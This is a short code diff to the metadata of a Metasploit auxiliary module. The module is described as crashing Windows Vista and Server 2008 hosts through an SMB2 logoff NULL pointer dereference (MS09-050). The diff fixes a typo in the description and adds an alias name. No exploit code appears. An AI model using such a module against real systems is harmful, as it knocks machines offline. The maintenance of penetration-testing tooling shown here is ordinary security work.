@@ -15,7 +15,7 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           This module triggers a NULL pointer dereference in the SRV2.SYS kernel driver when processing
           an SMB2 logoff request before a session has been correctly negotiated, resulting in a BSOD.
-          Effecting Vista SP1/SP2 (And possibly Server 2008 SP1/SP2), the flaw was resolved with MS09-050.
+          Affecting Vista SP1/SP2 (and possibly Server 2008 SP1/SP2), the flaw was resolved with MS09-050.
         },
         'Author' => [ 'sf' ],
         'License' => MSF_LICENSE,
@@ -25,6 +25,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'MSB', 'MS09-050' ],
         ],
         'Notes' => {
+          'AKA' => ['EDUCATEDSCHOLAR'],
           'Stability' => [CRASH_OS_DOWN],
           'SideEffects' => [],
           'Reliability' => []
